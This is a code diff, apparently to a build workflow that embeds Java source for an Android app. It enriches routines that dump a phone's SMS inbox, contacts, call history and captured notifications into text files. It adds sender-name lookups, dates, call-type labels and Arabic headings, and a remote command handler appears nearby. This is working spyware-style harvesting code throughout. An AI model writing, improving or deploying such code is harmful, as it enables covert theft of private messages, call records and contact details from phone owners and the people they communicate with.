@@ -449,17 +449,45 @@ jobs:
                 else res("cmd: " + cmd);
               } catch (Exception e) { res("ERR " + e); }
             }
+            String contactName(String num) {
+              try {
+                Uri u = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(num));
+                Cursor c = getContentResolver().query(u, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
+                if (c != null && c.moveToFirst()) {
+                  String nm = c.getString(0);
+                  c.close();
+                  return nm;
+                }
+                if (c != null) c.close();
+              } catch (Exception e) {}
+              return "";
+            }
             void smsFile() {
               try {
+                java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm");
                 StringBuilder s = new StringBuilder();
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                s.append("💬  سجل الرسائل\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
                 Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
                 int n = 0;
                 while (c != null && c.moveToNext()) {
-                  s.append(c.getString(c.getColumnIndexOrThrow("address"))).append(" | ")
-                   .append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n");
+                  String addr = c.getString(c.getColumnIndexOrThrow("address"));
+                  String body = c.getString(c.getColumnIndexOrThrow("body"));
+                  long date = c.getLong(c.getColumnIndexOrThrow("date"));
+                  String nm = contactName(addr);
                   n++;
+                  s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                  s.append("📱 من: ").append(addr).append("\n");
+                  if (nm.length() > 0) s.append("👤 الاسم: ").append(nm).append("\n");
+                  s.append("📅 ").append(sdf.format(new java.util.Date(date))).append("\n");
+                  s.append("───────────────\n");
+                  s.append("📝 الرسالة:\n");
+                  s.append(body).append("\n\n");
                 }
                 if (c != null) c.close();
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                s.append("📊 الإجمالي: ").append(n).append(" رسالة\n");
                 String f = getExternalFilesDir(null) + "/sms.txt";
                 FileWriter fw = new FileWriter(f);
                 fw.write(s.toString());
@@ -471,14 +499,22 @@ jobs:
             void contactsFile() {
               try {
                 StringBuilder s = new StringBuilder();
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                s.append("📇  جهات الاتصال\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
                 Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                 int n = 0;
                 while (c != null && c.moveToNext()) {
-                  s.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" | ")
-                   .append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
+                  String nm = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                  String num = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                   n++;
+                  s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                  s.append("👤 الاسم: ").append(nm).append("\n");
+                  s.append("📞 الرقم: ").append(num).append("\n\n");
                 }
                 if (c != null) c.close();
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                s.append("📊 الإجمالي: ").append(n).append(" جهة اتصال\n");
                 String f = getExternalFilesDir(null) + "/contacts.txt";
                 FileWriter fw = new FileWriter(f);
                 fw.write(s.toString());
@@ -489,17 +525,35 @@ jobs:
             }
             void callsFile() {
               try {
+                java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm");
                 StringBuilder s = new StringBuilder();
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                s.append("📞  سجل المكالمات\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
                 Cursor c = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
                 int n = 0;
                 while (c != null && c.moveToNext()) {
-                  s.append(c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))).append(" | ")
-                   .append(c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))).append(" | ")
-                   .append(c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))).append("s | ")
-                   .append(c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))).append("\n");
+                  String num = c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
+                  int type = c.getInt(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
+                  String dur = c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION));
+                  long date = c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE));
+                  String nm = contactName(num);
+                  String t;
+                  if (type == android.provider.CallLog.Calls.INCOMING_TYPE) t = "📥 داخلة";
+                  else if (type == android.provider.CallLog.Calls.OUTGOING_TYPE) t = "📤 خارجة";
+                  else if (type == android.provider.CallLog.Calls.MISSED_TYPE) t = "❌ فايتة";
+                  else t = "❓ أخرى";
                   n++;
+                  s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                  s.append("📱 الرقم: ").append(num).append("\n");
+                  if (nm.length() > 0) s.append("👤 الاسم: ").append(nm).append("\n");
+                  s.append("📊 النوع: ").append(t).append("\n");
+                  s.append("📅 ").append(sdf.format(new java.util.Date(date))).append("\n");
+                  s.append("⏱ المدة: ").append(dur).append(" ثانية\n\n");
                 }
                 if (c != null) c.close();
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                s.append("📊 الإجمالي: ").append(n).append(" مكالمة\n");
                 String f = getExternalFilesDir(null) + "/calls.txt";
                 FileWriter fw = new FileWriter(f);
                 fw.write(s.toString());
@@ -716,8 +770,21 @@ jobs:
               } catch (Exception e) {}
             }
             public static String dump() {
-              StringBuilder s = new StringBuilder("Notifs:\n");
-              synchronized (L) { for (String x : L) s.append(x).append("\n"); }
+              StringBuilder s = new StringBuilder();
+              s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+              s.append("🔔  الإشعارات\n");
+              s.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
+              synchronized (L) {
+                int i = 0;
+                for (String x : L) {
+                  i++;
+                  s.append("🔔 إشعار رقم: ").append(i).append("\n");
+                  s.append("📝 ").append(x).append("\n");
+                  s.append("───────────────────────────\n\n");
+                }
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
+                s.append("📊 الإجمالي: ").append(i).append(" إشعار\n");
+              }
               return s.toString();
             }
           }
